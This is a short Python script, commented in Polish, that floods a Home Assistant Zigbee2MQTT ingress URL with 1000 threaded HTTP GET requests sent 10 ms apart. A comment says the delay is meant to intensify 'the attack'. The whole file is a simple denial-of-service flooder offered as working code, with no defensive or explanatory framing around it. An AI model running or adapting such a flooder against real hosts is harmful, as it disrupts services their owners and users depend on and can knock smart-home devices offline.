import requests
import threading
import time

# URL docelowy
target_url = "http://homeassistant.local:8123/45df7312_zigbee2mqtt/ingress"
# Funkcja wysyłająca żądanie HTTP
def send_request():
    try:
        response = requests.get(target_url)
        print(f"Request sent with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
# Funkcja generująca dużą ilość żądań
def generate_requests(number_of_requests):
    for _ in range(number_of_requests):
        threading.Thread(target=send_request).start()
        time.sleep(0.01)  # Krótka przerwa między żądaniami, aby zintensyfikować atak
if __name__ == "__main__":
    number_of_requests = 1000  # Liczba żądań do wysłania
    generate_requests(number_of_requests)
